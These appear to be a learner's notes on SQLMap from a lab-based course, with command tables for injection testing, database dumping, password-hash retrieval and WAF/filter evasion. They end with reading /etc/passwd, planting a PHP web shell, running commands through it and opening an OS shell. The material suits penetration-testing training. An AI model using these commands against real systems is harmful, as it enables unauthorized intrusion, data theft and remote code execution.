# Section 4 - Running SQLMap on an HTTP Request


Put `*` where the value you want SQLMap to test is located. `id=*1` would tell SQLMap to test at the beginning of the value instead. **For a normal value like `id=1`, use `id=1*`.*** If you **don't specify `*`**, SQLMap will usually **automatically test the parameters it considers injectable**. Such as:

|Command|Description|
|---|---|
|`sqlmap -u "http://target.com?id=1*"`|The `*` tells SQLMap **exactly where to test for SQL injection**. Here, SQLMap tests the value `1`.|
|`sqlmap -u "http://target.com" --data="username=admin&age=25*"`|Tell SQLMap to test specifically the **`age` value** in the POST data.|
|`sqlmap -u "http://target.com" --cookie="id=1*"`|Tell SQLMap to test specifically the **`id` value inside the cookie**.|


| Command                                                                              | Description                                                                                                 |
| ------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------- |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`                          | Test a **POST request**. `--data` tells SQLMap to send these parameters in the request body.                |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`                         | Test a POST request and tell SQLMap exactly where to look for SQL injection. `*` marks the injection point. |
| `sqlmap -r req.txt`                                                                  | Use a **saved HTTP request** from a file instead of writing the URL and parameters manually.                |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`                   | Send a specific **cookie** with the request, useful when the target requires an existing login/session.     |
| `sqlmap -u www.target.com --data='id=1' --method PUT`                                | Send the request using the **PUT HTTP method** instead of the default method.                               |

## Questions

**Don't only look for parameters in the URL. Look at the entire HTTP request for user-controlled input.** Use Burp to inspect the full HTTP request and find where user-controlled input is being sent. Using BurpSuite, You can find potential SQL injection points in:

- **URL:** `?id=1`
- **POST body:** `id=1`
- **JSON body:** `{"id":1}`
- **Cookie:** `Cookie: id=1`

1. `sqlmap  'http://SERVERIP:PORT/case2.php' --data='id=*1' --batch --dump -T flag2`
2. `sqlmap 'http://SERVERIP:PORT/case3.php'  --cookie='id=1*' --batch --dump  -T flag3`
3. `sqlmap http://SERVERIP:PORT/case4.php --data='{"id":1}' --method=POST --batch --dump -T flag4`

JSON uses `:` between the key and value: `{"id":1}`, **not** `{"id"=1}`.

# Section 6 - Attack Tuning

####  Useful Detection Options

| Command                                              | Description                                                                                                                              |
| ---------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| `sqlmap -u "http://target.com?id=1" --level=5`       | Increase the **number of tests SQLMap performs**. Higher level means SQLMap checks more possible injection points and request locations. |
| `sqlmap -u "http://target.com?id=1" --risk=3`        | Increase the **risk of the tests** SQLMap performs. Higher risk can use more aggressive payloads.                                        |
| `sqlmap -u "http://target.com?id=1" --technique=T`   | Test only **time-based blind SQL injection**. Useful when the application does not show useful differences in the response.              |
| `sqlmap -u "http://target.com?id=1" --flush-session` | Delete SQLMap's saved session data for the target and make SQLMap **start the testing again from scratch**.                              |
| `sqlmap --list-tampers`                              | Show the available **tamper scripts**, which can modify SQLMap's payloads.                                                               |

### Advanced Tuning

These options are mainly useful when **SQLMap cannot clearly tell TRUE and FALSE responses apart**, or when a **UNION injection needs extra information**.

#### Prefix and Suffix

| Command                                                           | Description                                                                                                           |
| ----------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| `sqlmap -u "http://target.com?id=1" --prefix="'"`                 | Add a **custom prefix** before SQLMap's payload. Example: `'` can close an existing string before the injection.      |
| `sqlmap -u "http://target.com?id=1" --suffix="-- -"`              | Add a **custom suffix** after SQLMap's payload. Example: `-- -` comments out the rest of the original SQL query.      |
| `sqlmap -u "http://target.com?id=1" --prefix="'" --suffix="-- -"` | Use **both** a custom prefix and suffix. Useful when you know how the application's original SQL query is structured. |

#### 1. Status Codes

|Command|Description|
|---|---|
|`sqlmap -u "http://target.com?id=1" --code=200`|Tell SQLMap that **HTTP 200 means TRUE**. In this case, `200 → TRUE` and other status codes are treated as FALSE.|
|`sqlmap -u "http://target.com?id=1" --code=500`|Tell SQLMap that **HTTP 500 means TRUE**. In this case, `500 → TRUE` and other status codes are treated as FALSE.|

#### 2. Page Titles

| Command                                       | Description                                                                                                                                               |
| --------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sqlmap -u "http://target.com?id=1" --titles` | Tell SQLMap to compare the **HTML page titles** to detect TRUE/FALSE responses. Example: `<title>Success</title> → TRUE`, `<title>Error</title> → FALSE`. |

#### 3. Specific Strings

|Command|Description|
|---|---|
|`sqlmap -u "http://target.com?id=1" --string=success`|Tell SQLMap that finding **`success`** in the response means TRUE. Example: `"Login success" → TRUE`, `"Login failed" → FALSE`.|

#### 4. Text Only

| Command                                          | Description                                                                                                                                                             |
| ------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sqlmap -u "http://target.com?id=1" --text-only` | Tell SQLMap to ignore HTML tags and compare only the **visible text**. Example: visible text is compared, while `<script>`, `<style>`, and `<meta>` content is ignored. |

#### 5. SQLi Techniques

|Command|Description|
|---|---|
|`sqlmap -u "http://target.com?id=1" --technique=BEU`|Tell SQLMap to test only **Boolean-based, Error-based, and UNION-based** SQL injection. Example: `B → Boolean`, `E → Error`, `U → UNION`.|

|Letter|Meaning|
|---|---|
|`B`|Boolean-based blind|
|`E`|Error-based|
|`U`|UNION query|
|`S`|Stacked queries|
|`T`|Time-based blind|
|`Q`|Inline queries|

#### 6. UNION SQLi Tuning

|Command|Description|
|---|---|
|`sqlmap -u "http://target.com?id=1" --union-cols=17`|Tell SQLMap that the original query has **17 columns**. Example: `--union-cols=17 → SQLMap uses 17 UNION columns`.|
|`sqlmap -u "http://target.com?id=1" --union-char='a'`|Tell SQLMap to use **`a` as the filler value** for UNION columns instead of its normal dummy values such as `NULL`.|
|`sqlmap -u "http://target.com?id=1" --union-from=users`|Tell SQLMap to use **`users` in the `FROM` part** of the UNION query.|

# Section 7,8 -  Database Enumeration

| Command                                                                                       | Description                                                                                                                       |
| --------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`      | Find basic information about the database, such as the DB version, current user, current database, and whether the user is a DBA. |
| `sqlmap -u "http://www.example.com/?id=1" --schema`                                           | Show the database structure, including databases, tables, and columns.                                                            |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`                                 | Show all tables inside the `testdb` database.                                                                                     |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`          | Extract the `name` and `surname` columns from the `users` table in `testdb`.                                                      |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | Extract only rows from `users` where the `name` starts with `f`.                                                                  |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`                                   | Search the database for tables containing a name matching `user`.                                                                 |
| `sqlmap -u "http://target.com?id=1" --dump -D testdb`                                         | Dumps **all tables/data inside `testdb`**. No `-T` is needed because you want everything in that database.                        |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`                                | Try to retrieve database user password hashes and automatically proceed with SQLMap's password-related actions.                   |
| `sqlmap -u "http://target.com?id=1" --dump`                                                   | Dumps data from the **current database**.                                                                                         |
| `sqlmap -u "http://target.com?id=1" --dump-all`                                               | Dumps data from **all databases**.                                                                                                |
| `sqlmap -u "http://target.com?id=1" --dump-all --exclude-sysdbs`                              | Dumps data from **all non-system databases**, skipping system databases.                                                          |
| `sqlmap -u "http://www.example.com/?id=1" --search -C pass`                                   |                                                                                                                                   |

Tip: The '--all' switch in combination with the '--batch' switch, will automatically do the whole enumeration process on the target itself, and provide the entire enumeration details, but takes longer time.

# Section 9 - Bypassing Web Application Protections

We don't need to guess which protection is blocking SQLMap. First, we run SQLMap normally and look at its output. If something goes wrong, we compare the normal request with the request SQLMap sends and then look at the server's response. **Burp Suite is very useful here because we can see exactly what is being sent and what comes back.** For example, if we see a changing `csrf-token` in the request, the website may be using CSRF protection, so we can use `--csrf-token`. If a parameter has to be different for every request, we can use `--randomize`. If one parameter is calculated from another parameter, such as `h=MD5(id)`, we can use `--eval` to calculate it again. If normal requests work but SQLMap starts getting `403`, `406`, or similar blocking responses, there may be a WAF or another filter blocking the SQLMap requests. If the problem appears to be SQLMap's User-Agent being blocked, we can try `--random-agent`. If the WAF is blocking the SQL syntax itself, we can investigate `--tamper`. The main idea is: **run SQLMap → look at the request and response → find what is different or being blocked → choose the option that matches that problem.**

| Command                                                                                           | Easy Description                                                                                                                                                                                                                                                                                                   |
| ------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `sqlmap -u "http://target.com?id=1" --csrf-token="csrf-token"`                                    | **CSRF token bypass.** Some websites require a changing security token in every request. SQLMap reads the fresh token from the response and uses it in the next request.                                                                                                                                           |
| `sqlmap -u "http://target.com?id=1&rp=29125" --randomize=rp`                                      | **Random value bypass.** Tells SQLMap to generate a new random value for `rp` before each request. Useful when the website requires this value to change every time.                                                                                                                                               |
| `sqlmap -u "http://target.com?id=1&h=..." --eval="import hashlib; h=hashlib.md5(id).hexdigest()"` | **Calculated parameter bypass.** If `h` must contain the MD5 hash of `id`, SQLMap recalculates `h` whenever it changes `id`.                                                                                                                                                                                       |
| `sqlmap -u "http://target.com?id=1" --proxy="socks4://127.0.0.1:9050"`                            | **Use a proxy.** Sends SQLMap's requests through the specified proxy instead of connecting directly to the target.                                                                                                                                                                                                 |
| `sqlmap -u "http://target.com?id=1" --proxy-file=proxies.txt`                                     | **Use multiple proxies.** SQLMap takes proxies from the file and can move to another proxy if one does not work.                                                                                                                                                                                                   |
| `sqlmap -u "http://target.com?id=1" --tor`                                                        | **Use Tor.** Tor is a network that sends traffic through multiple relays before reaching the destination, so the target normally sees a **Tor exit node's IP instead of my real IP**. This can help when I need to avoid exposing my direct source IP or when testing how an application handles traffic from Tor. |
| `sqlmap --check-tor`                                                                              | **Check Tor.** Verifies that SQLMap is actually communicating through the Tor network.                                                                                                                                                                                                                             |
| `sqlmap -u "http://target.com?id=1" --skip-waf`                                                   | **Skip WAF detection.** SQLMap normally performs an initial test for a Web Application Firewall. This option tells SQLMap not to perform that detection test.                                                                                                                                                      |
| `sqlmap -u "http://target.com?id=1" --random-agent`                                               | **Change User-Agent.** SQLMap normally identifies itself as SQLMap. This option makes it use a randomly selected browser-like User-Agent instead.                                                                                                                                                                  |
| `sqlmap -u "http://target.com?id=1" --tamper=between`                                             | **Modify the payload.** A tamper script changes SQLMap's generated payload before sending it. Useful when a filter/WAF blocks the normal SQL syntax.                                                                                                                                                               |
| `sqlmap -u "http://target.com?id=1" --tamper=between,randomcase`                                  | **Use multiple tamper scripts.** Applies `between` and `randomcase` to the payload before sending it.                                                                                                                                                                                                              |
| `sqlmap --list-tampers`                                                                           | **List tamper scripts.** Shows the available tamper scripts and what each one does.                                                                                                                                                                                                                                |
| `sqlmap -u "http://target.com?id=1" --chunked`                                                    | **Chunked request.** Sends the HTTP request body in smaller chunks instead of one complete piece. This can sometimes bypass simple request filtering.                                                                                                                                                              |
| `sqlmap -u "http://target.com?id=1" --hpp`                                                        | **HTTP Parameter Pollution.** Splits a payload across repeated parameters, such as `id=1&id=UNION&id=SELECT`. Some web servers combine these values before processing them.                                                                                                                                        |

# Section 10 - File & OS Exploitation

| Command                                                                                                   | Description                                                                                                                         |
| --------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                      | Read a file from the **database server's filesystem**, such as `/etc/passwd`.                                                       |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Upload/write a local file onto the **database server** at the specified destination path.                                           |
| `curl http://www.example.com/shell.php?cmd=ls+-la`                                                        | attempt to access the remote PHP shell, and execute                                                                                 |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                     | Try to give  an **operating-system command shell** on the database server.                                                          |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E`                                       | To have a better chance of giving us direct output, like the `Error-based SQL Injection`, which we can specify with `--technique=E` |
